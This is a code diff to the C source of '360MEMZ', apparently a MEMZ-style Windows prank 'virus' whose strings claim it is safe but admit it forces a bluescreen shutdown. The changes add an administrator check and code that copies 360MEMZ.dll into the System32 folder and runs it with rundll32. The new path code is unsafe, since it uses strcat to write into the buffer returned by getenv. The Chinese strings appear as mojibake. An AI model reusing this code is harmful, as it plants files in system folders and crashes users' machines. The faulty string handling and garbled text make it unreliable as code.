@@ -1,10 +1,10 @@
 #include "360MEMZ.h"
 
-const wchar_t *tips = L"ÄãµÄµçÄÔ±»\"360MEMZµÄ¸´³ğ\"Ï«ÁË!!!\n\
-µ«ÊÇÕâÊÇÒ»¸ö¡°°²È«¡±µÄÌØĞ§³ÌĞò×é¡£\n\
-Äã¿ÉÒÔËæÊ±¹Ø±ÕËü£¬³ıÀ¶ÆÁÇ¿ÖÆ¹Ø»úÍâ²»»á¶ÔµçÄÔÔì³ÉÈÎºÎËğº¦¡£\n\n\
-ËùÒÔ·ÅĞÄvan¡á°É£¡ \n\
-³ÌĞò×é×÷Õß£ºbÕ¾@ê¸í³Âü_gt428";
+const wchar_t *tips = L"ä½ çš„ç”µè„‘è¢«\"360MEMZçš„å¤ä»‡\"æ±äº†!!!\n\
+ä½†æ˜¯è¿™æ˜¯ä¸€ä¸ªâ€œå®‰å…¨â€çš„ç‰¹æ•ˆç¨‹åºç»„ã€‚\n\
+ä½ å¯ä»¥éšæ—¶å…³é—­å®ƒï¼Œé™¤è“å±å¼ºåˆ¶å…³æœºå¤–ä¸ä¼šå¯¹ç”µè„‘é€ æˆä»»ä½•æŸå®³ã€‚\n\n\
+æ‰€ä»¥æ”¾å¿ƒvanâ™‚å§ï¼ \n\
+ç¨‹åºç»„ä½œè€…ï¼šbç«™@æ—®æ²“æ›¼_gt428";
 
 HCRYPTPROV prov;
 
@@ -43,7 +43,7 @@ MCIERROR openSound(LPWSTR path, LPWSTR alias, LPWSTR type) {
 MCIERROR resetSound(LPWSTR alias) {
 	MCI_SEEK_PARMS params;
 	memset(&params, 0, sizeof(params));
-	return mciSendCommand(mciGetDeviceID(alias), MCI_SEEK, MCI_SEEK_TO_START, (DWORD)&params);
+	return mciSendCommand(mciGetDeviceID(alias), MCI_SEEK, MCI_SEEK_TO_START, (unsigned __int64)&params);
 }
 
 MCIERROR playSound(LPWSTR alias, BOOL async) {
@@ -117,7 +117,7 @@ LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
 
 DWORD WINAPI Box1(LPVOID para){
 	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
-	MessageBox(NULL, L"ÈıÁ¬ÒÔ½øÈë²¡¶¾!", L"360MEMZ", MB_ICONERROR);
+	MessageBox(NULL, L"ä¸‰è¿ä»¥è¿›å…¥ç—…æ¯’!", L"360MEMZ", MB_ICONERROR);
 	UnhookWindowsHookEx(hook);
 	return 0;
 }
@@ -132,8 +132,8 @@ DWORD WINAPI VideoThread(LPVOID lpParameter){
 }
 
 int main(){
-	if(!IsWin7OrLater()){
-		MessageBox(NULL, L"´Ë³ÌĞòĞèÒªWindows 7 ¼°ÒÔÉÏ²ÅÄÜÔËĞĞ£¡", L"360MEMZ", MB_ICONERROR);
+	if((!IsWin7OrLater())||(!IsUserAnAdmin())){
+		MessageBox(NULL, L"æ­¤ç¨‹åºéœ€è¦Windows 7 åŠä»¥ä¸Šä¸”æ‹¥æœ‰ç®¡ç†å‘˜æƒé™æ‰èƒ½è¿è¡Œï¼", L"360MEMZ", MB_ICONERROR);
 	}
 	scrh = GetSystemMetrics(SM_CXSCREEN), scrw = GetSystemMetrics(SM_CYSCREEN);
 	setlocale(LC_ALL, "chs");
@@ -166,8 +166,14 @@ int main(){
 		
 		Sleep(50);
 	}
-	
-	CopyFile(L"360MEMZ.dll",  L"C:\\Windows\\System32\\360MEMZ.dll", FALSE);
+
+
+const char *sysroot =strcat(getenv("SystemRoot"),"\\System32\\360MEMZ.dll") ;
+	WCHAR TempVar[256];
+	memset(TempVar,0,sizeof(TempVar));
+	MultiByteToWideChar(CP_ACP,0,sysroot,strlen(sysroot)+1,TempVar,
+		sizeof(TempVar)/sizeof(TempVar[0]));
+CopyFile(L"360MEMZ.dll",TempVar, FALSE);
 	Sleep(2000);
 	
 	ShellExecuteA(NULL, NULL, "rundll32.exe", "360MEMZ.dll,RecycleBin", NULL, SW_SHOWDEFAULT);
